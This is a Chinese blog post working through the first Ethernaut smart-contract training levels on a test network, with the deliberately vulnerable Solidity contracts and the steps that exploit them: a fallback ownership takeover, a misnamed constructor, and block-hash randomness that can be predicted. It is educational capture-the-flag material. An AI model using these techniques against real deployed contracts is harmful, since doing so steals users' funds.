<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">


  <meta name="keywords" content="CTF,Crypto,">





  <link rel="alternate" href="/atom.xml" title="Ver" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">






<meta name="description" content="简介ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做) 题目链接 另外也放上大哥的writeup跟着学习一下链接">
<meta name="keywords" content="CTF,Crypto">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut训练">
<meta property="og:url" content="http://yoursite.com/2019/01/08/ethernautd训练/index.html">
<meta property="og:site_name" content="Ver">
<meta property="og:description" content="简介ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做) 题目链接 另外也放上大哥的writeup跟着学习一下链接">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/1.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/2.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/3.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/4.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/5.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/6.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/7.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/8.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/9.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/10.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/11.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/12.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/15.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/16.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/17.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/19.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/20.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/22.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/23.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/25.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/26.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/27.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/29.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/30.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/32.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/33.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/34.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/35.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/36.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/37.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/38.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/39.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/40.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/41.jpg">
<meta property="og:image" content="http://yoursite.com/2019/01/08/ethernautd训练/42.jpg">
<meta property="og:updated_time" content="2019-02-23T02:49:22.643Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ethernaut训练">
<meta name="twitter:description" content="简介ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做) 题目链接 另外也放上大哥的writeup跟着学习一下链接">
<meta name="twitter:image" content="http://yoursite.com/2019/01/08/ethernautd训练/1.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/01/08/ethernautd训练/">





  <title>Ethernaut训练 | Ver</title>
  














</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Ver</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/08/ethernautd训练/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Vergissmeinnicht">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ver">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Ethernaut训练</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-08T16:26:39+08:00">
                2019-01-08
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Crypto/" itemprop="url" rel="index">
                    <span itemprop="name">Crypto</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做)</p>
<p><a href="https://ethernaut.zeppelin.solutions/level/0x6545df87f57d21cb096a0bfcc53a70464d062512" target="_blank" rel="noopener">题目链接</a></p>
<p>另外也放上大哥的writeup跟着学习一下<br><a href="http://ultramangaia.github.io/blog/2018/Ethernaut%E8%AE%AD%E7%BB%83writeup.html#more" target="_blank" rel="noopener">链接</a><br><a id="more"></a></p>
<hr>
<h2 id="level-0-Hello-Ethernaut"><a href="#level-0-Hello-Ethernaut" class="headerlink" title="level 0 - Hello Ethernaut"></a>level 0 - Hello Ethernaut</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>首先是简单的教程，先下载MetaMask插件并且注册账号，然后设置钱包并使用Ropsten测试网络</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/1.jpg" alt="MetaMask和Ropsten测试网络"></div>

<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>打开控制台，然后会发现给了合约地址和help</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/2.jpg" alt="合约地址"></div><br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/3.jpg" alt="help"></div><br>其中level地址为 <code>0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c</code><br><br>在Ropsten测试网络下还会有你的player地址和Ethernaut地址<br>使用player指令可以直接获得player地址<br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/4.jpg" alt="player地址和Ethernaut地址"></div>

<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>之后会让你使用getBalance函数获得你的以太坊的数量，并且让你使用help(),由于我们第二步使用过，就不再演示了<br>PS:由于在Ropsten测试网络中可以直接通过Ether Faucet获得测试以太坊，所以我的数额为7</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/5.jpg" alt="调用getBalance"></div>

<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>使用ethernaut指令可以直接输出当前合约的有关信息，其中的abi可以理解为合约中的<code>公共</code>方法列表，当然在下面可以看见例如<code>owner: f()</code>之类的东西就是方法的具体信息</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/6.jpg" alt="查看合约信息"></div>

<h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>与ABI互动，也就是可以调用上一步说的方法列表里的方法，系统让我们调用<code>ethernaut.owner()</code>，返回的是智能合约的拥有者</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/7.jpg" alt="调用owner"></div>

<h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p>这一步就是让我们通过上面提到的Ether Faucet获得测试以太坊，可以将MetaMask调至<code>中文</code>，然后点击<code>存入</code>-<code>测试水管</code>，之后点击<code>request 1 ether from faucet</code>就行</p>
<h3 id="第七步"><a href="#第七步" class="headerlink" title="第七步"></a>第七步</h3><p>生成合约实例，点击下面的蓝色按钮即可，需要等待一段时间</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/8.jpg" alt="获取实例按钮"></div><br>成功之后会显示下图<br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/9.jpg" alt="成功"></div>

<h3 id="第八步"><a href="#第八步" class="headerlink" title="第八步"></a>第八步</h3><p>题目告诉你生成的合约实例可以调用合约的ABI，也可以自己试试，用<code>contract.方法</code>就行</p>
<h3 id="第九步"><a href="#第九步" class="headerlink" title="第九步"></a>第九步</h3><p>从<code>contract.info()</code>入手跟着走下去就行</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/10.jpg" alt="10"></div><br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/11.jpg" alt="11"></div><br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/12.jpg" alt="12"></div>

<p>之后点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋"><a href="#通关后的彩蛋" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>Congratulations! You have completed the tutorial. Have a look at the Solidity code for the contract you just interacted with below.<br>You are now ready to complete all the levels of the game, and as of now, you’re on your own.<br>Godspeed!!</p>
</blockquote>
<hr>
<h2 id="level-1-Fallback"><a href="#level-1-Fallback" class="headerlink" title="level 1 - Fallback"></a>level 1 - Fallback</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0x234094aac85628444a82dae0396c680974260be7" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件"><a href="#胜利条件" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.获得合约的所有权<br>2.收回合约的所有余额</p>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>1.如何用ABI发送ether<br>2.如何用ABI以外的方法发送ether<br>3.查看help()会有帮助<br>4.Fallback方法</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback <span class="keyword">is</span> Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line"></span><br><span class="line">  function Fallback() public &#123; //构造函数，初始化owner的contributions为<span class="number">1000</span></span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123; //将合约拥有权交给贡献<span class="number">1000</span>ETH以上的人</span><br><span class="line">    require(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123; </span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123; //查询contribution</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123; //owner收回合约的所有余额，只有owner可以调用</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() payable public &#123; //fallback函数，当满足发送的value大于<span class="number">1</span>并且发送者的contributions的值大于<span class="number">1</span>时将owner变为消息发送者</span><br><span class="line">    require(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p>回退函数(fallback function)<br>1.每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。</p>
<p>2.此外，当合约收到ether时（没有任何其它数据），这个函数也会被执行。向合约发送 <code>send</code>、<code>transfer</code>、<code>call</code> 消息时候都会调用 <code>fallback</code> 函数，不同的是 <code>send</code> 和 <code>transfer</code> 有 <code>2300 gas</code> 的限制，也就是传递给 <code>fallback</code> 的只有 <code>2300 gas</code>，这个 <code>gas</code> 只能用于记录日志，因为其他操作都将超过 <code>2300 gas</code>。但 <code>call</code> 则会把剩余的所有 <code>gas</code> 都给 <code>fallback</code> 函数，这有可能导致循环调用。</p>
<p>我们在这里要用到的就是第二点</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>最终目的是调用<code>withdraw()</code>方法将余额清零，也就是我们要成为<code>owner</code><br>contribute里面虽然有可能称为owner，但是代价太过昂贵（1000ETH且每次只能发送小于0.001的ETH）<br>在<code>fallback</code>中只要满足<code>msg.value&gt;0</code>且<code>contributions[msg.sender]&gt;0</code>即可成为owner<br>其中<code>msg.value</code>我们可以直接发送过去，而<code>contributions[msg.sender]</code>我们需要调用<code>contribute()</code>这个函数，也就是参数满足<code>value&lt;0.001</code>的条件就行</p>
<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.调用<code>contribute</code>函数，传入参数<code>value=1</code><br>其中value的单位是wei</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> eth = <span class="number">1e9</span> Gwei = <span class="number">1e18</span> wei</span><br></pre></td></tr></table></figure>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/15.jpg" alt="15"></div>


<p>2.调用<code>send</code>函数，传入参数1(也可以在钱包里直接打钱，不过听说打钱会有bug，就直接用send了，当然也可以用<code>contract.sendTransaction({value: 100})</code>)， 由于<code>send</code>函数会调用fallback函数，我们便成为了<code>owner</code></p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/16.jpg" alt="16"></div>


<p>3.调用<code>withdraw</code>函数，将钱卷走</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/17.jpg" alt="17"></div>


<p>4.点击<code>submit instance</code>即可过关。</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>绝对不要操作太快了，每一步传值的时候都要等到右下弹出提示再继续,否则可能和我一样一个账号40多条操作在排队，过了一个小时都没反应,只能再开一个账号<em>(:зゝ∠)</em></p>
<h3 id="通关后的彩蛋-1"><a href="#通关后的彩蛋-1" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.<br>You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.<br>Move on to the next level when you’re ready!</p>
</blockquote>
<hr>
<h2 id="level-2-Fallout"><a href="#level-2-Fallout" class="headerlink" title="level 2 - Fallout"></a>level 2 - Fallout</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0x220beee334f1c1f8078352d88bcc4e6165b792f6" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-1"><a href="#胜利条件-1" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.获得合约的所有权</p>
<h3 id="tips-1"><a href="#tips-1" class="headerlink" title="tips"></a>tips</h3><p>1.Solidity Remix IDE</p>
<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout <span class="keyword">is</span> Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>可以看出函数的构造函数写错了，<code>Fallout</code>写成了<code>Fal1out</code>，变为了谁都可以调用的函数(我们无法调用构造函数)。<br>所以我们可以调用构造函数成为<code>owner</code>，然后再调用<code>collectAllocations</code>取钱</p>
<h3 id="具体步骤-1"><a href="#具体步骤-1" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.调用<code>Fal1out</code>函数，成为<code>owner</code></p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/19.jpg" alt="19"></div>

<p>2.调用<code>collectAllocations</code>函数，将钱卷走</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/20.jpg" alt="20"></div>

<p>3.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-2"><a href="#通关后的彩蛋-2" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>That was silly wasn’t it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?<br>Well… Not quite.<br>The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but somehow they didn’t rename the constructor method of its contract:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; contract Rubixi &#123;</span><br><span class="line">&gt;         address private owner;</span><br><span class="line">&gt;         function DynamicPyramid() &#123; owner = msg.sender; &#125;</span><br><span class="line">&gt;         function collectAllFees() &#123; owner.transfer(this.balance) &#125;</span><br><span class="line">&gt;         ...</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.</p>
</blockquote>
<hr>
<h2 id="level-3-Coin-Flip"><a href="#level-3-Coin-Flip" class="headerlink" title="level 3 - Coin Flip"></a>level 3 - Coin Flip</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0xd340de695bbc39e72df800dfde78a20d2ed94035" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-2"><a href="#胜利条件-2" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.猜抛硬币的结果，连续猜对十次即可获胜</p>
<h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> true;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="预备知识-1"><a href="#预备知识-1" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.revert()<br>这行代码：<br><code>if(msg.sender != owner) { throw; }</code><br>完全等价于如下三种形式：<br><code>if(msg.sender != owner) { revert(); }</code><br><code>assert(msg.sender == owner);</code><br><code>require(msg.sender == owner);</code></p>
<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.从随机数逻辑生成来看，主要有三个步骤<br>&nbsp;&nbsp;&nbsp;&nbsp;a.获取上一个块的hash<br>&nbsp;&nbsp;&nbsp;&nbsp;b.判断hash是否和上一次的hash相同，相同则回退<br>&nbsp;&nbsp;&nbsp;&nbsp;c.根据<code>blockValue/FACTOR</code>的结果判断硬币正负</p>
<p>2.我们每次产生的随机数和前一块的hash有关，只需要编写合约进行同步计算即可</p>
